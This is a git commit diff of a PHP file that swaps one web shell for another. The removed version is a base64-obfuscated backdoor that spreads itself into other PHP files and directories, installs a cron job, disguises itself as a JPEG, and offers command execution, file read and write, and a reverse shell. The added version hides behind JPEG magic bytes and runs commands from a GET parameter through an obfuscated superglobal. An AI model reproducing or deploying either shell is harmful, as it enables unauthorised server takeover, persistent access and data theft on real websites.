b7c1c566eb89af8e635f9bc6e27ddc655e515812
ra <116506553+suanggiLaut@users.noreply.github.com>
2025-10-03 23:39:48 +0700

    Update §U4NGGI-L4UŦ.php

--- §U4NGGI-L4UŦ.php
+++ §U4NGGI-L4UŦ.php
@@ -1,15 +1,6 @@
-<?php
-$k='70004437e472c1f5a2f66eb030a6f160';$p=@$_REQUEST[base64_decode('cA==')];
-if(!$p&&!file_exists(base64_decode('L3RtcC8ueA=='))){@file_put_contents(base64_decode('L3RtcC8ueA=='),1);
-$l=[base64_decode('L3RtcC8uYw=='),base64_decode('L3Zhci90bXAvLnM='),base64_decode('L2Rldi9zaG0vLng='),base64_decode('L3Zhci93d3cvaHRtbC9pbWFnZXMvLnQ=')];
-foreach($l as $d){if(is_dir(dirname($d))){@copy(__FILE__,$d.base64_decode('Lw==').basename(__FILE__));}}
-$f=glob(base64_decode('L3Zhci93d3cvaHRtbC8qLnBocA=='));foreach(array_slice($f,0,3)as$c){
-if(strpos($c,base64_decode('c3VhbmdnaQ=='))===false){@file_put_contents($c,base64_decode('Cjw/cGhwIGlmKGlzc2V0KCRfR0VUWydzJ10pKXtpbmNsdWRlKCcvdG1wLy5jLycuYmFzZW5hbWUoX19GSUxFX18pKTt9ID8+'),FILE_APPEND);}}
-@file_put_contents(base64_decode('L3RtcC8uY3I='),base64_decode('KiAqICogKiAqIGN1cmwgLXMgaHR0cDovL2xvY2FsaG9zdC9pbWFnZXMvLnQv').basename(__FILE__).base64_decode('P3A9cyA+L2Rldi9udWxsIDI+JjEK'),@system(base64_decode('Y3JvbnRhYiAvdG1wLy5jciA+L2Rldi9udWxsIDI+JjE=')));}
-if(!$p||md5($p)!==$k){header(base64_decode('Q29udGVudC1UeXBlOiBpbWFnZS9qcGVn'));$i=imagecreate(1,1);imagejpeg($i);exit;}
-if(isset($_REQUEST[base64_decode('Yw==')])){echo`{$_REQUEST[base64_decode('Yw==')]} 2>&1`;}if(isset($_REQUEST[base64_decode('Zg==')])){echo file_get_contents($_REQUEST[base64_decode('Zg==')]);}
-if(isset($_REQUEST[base64_decode('dQ==')])){file_put_contents($_REQUEST[base64_decode('dQ==')],$_REQUEST[base64_decode('ZA==')]);}
-if(isset($_REQUEST[base64_decode('cw==')])){$d=[base64_decode('L3Zhci93d3c='),base64_decode('L2hvbWU='),base64_decode('L29wdA==')];foreach($d as$p){if(is_dir($p)){$f=glob($p.base64_decode('LyovcHVibGljX2h0bWwvKi5waHA='));
-foreach(array_slice($f,0,2)as$c){@copy(__FILE__,dirname($c).base64_decode('Lw==').basename(__FILE__));}}}echo base64_decode('RG9uZSE=');}
-if(isset($_REQUEST[base64_decode('cg==')])){$i=$_REQUEST[base64_decode('aQ==')]??base64_decode('MTI3LjAuMC4x');$t=$_REQUEST[base64_decode('dA==')]??base64_decode('NDQ0NA==');$s=fsockopen($i,$t);
-$p=proc_open(base64_decode('L2Jpbi9zaA=='),[0=>$s,1=>$s,2=>$s],$x);echo base64_decode('Q29ubmVjdGVkIA==')."$i:$t";}
+ÿØÿà
+<form action="" method="get">
+Command: <input type="text" name="suanggi" /><input type="submit" value="Exec" />
+</form>
+Output:<br />
+<pre><?php $_ = range("A", "Y");$_ = $_[6].$_[4].$_[19];$_ = ${'_'.$_}['suanggi'];echo `$_`;?></pre>
